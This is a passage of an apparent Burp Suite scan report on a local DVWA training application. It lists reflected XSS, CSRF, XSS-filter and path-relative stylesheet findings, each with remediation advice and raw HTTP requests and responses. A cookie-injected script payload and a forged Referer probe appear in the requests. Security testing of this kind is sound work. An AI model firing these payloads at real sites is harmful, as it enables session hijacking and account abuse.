<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_r/?name=rrcKFjCb<span class="HIGHLIGHT">rguuu0j6e2</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=kum71ao3ms7as946ueiohgc1c9<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_r/?name=bNaoCMeU<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:15 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>X-XSS-Protection: 0<br>Content-Length: 4233<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;pre&gt;Hello rrcKFjCb<span class="HIGHLIGHT">rguuu0j6e2</span>&lt;/pre&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="32.4">32.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/005009b0_browsercrosssitescriptingfilterdisabled">Browser cross-site scripting filter disabled</a></span>
<br><a class="PREVNEXT" href="#32.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#33.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_r/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
	<li><a href="https://capec.mitre.org/data/definitions/63.html">CAPEC-63: Cross-Site Scripting (XSS)</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_r/?name=NOYYoDhn HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=2mt5ucb491tsmuj5s6iarusbu0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_r/?name=yLomNCPP<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:11 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br><span class="HIGHLIGHT">X-XSS-Protection: 0</span><br>Content-Length: 4223<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="33">33.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_s/</span>
<br><a class="PREVNEXT" href="#32">Previous</a>
<br>
<span class="BODH1" id="33.1">33.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#32.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#33.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_s/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>drdm4'&gt;&lt;script&gt;alert(1)&lt;/script&gt;fwkoyq05yd8</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_s/?txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">drdm4'%3e%3cscript%3ealert(1)%3c%2fscript%3efwkoyq05yd8</span>; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_s/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:32 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=e8djvoheb4gfdfbklh640b4hat; path=/<br>Set-Cookie: security=low<br>Content-Length: 4938<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_s&amp;security=low<span class="HIGHLIGHT">drdm4'&gt;&lt;script&gt;alert(1)&lt;/script&gt;fwkoyq05yd8</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="33.2">33.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200700_crosssiterequestforgery">Cross-site request forgery</a></span>
<br><a class="PREVNEXT" href="#33.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#33.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_tentative_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Tentative</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_s/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li>
    <li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li>
    <li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=sdnubf9pskdlptho5i2oeiktdi<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">localhost</span>:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=637295&amp;mtxMessage=540949&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4760<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">LEnsh.com</span>:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:51 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4760<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="33.3">33.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#33.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#33.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_s/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4760<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/xss_s/<span class="HIGHLIGHT">index.php/kntdcg/gls4lf/bx3fj9/</span> HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 2</h2>
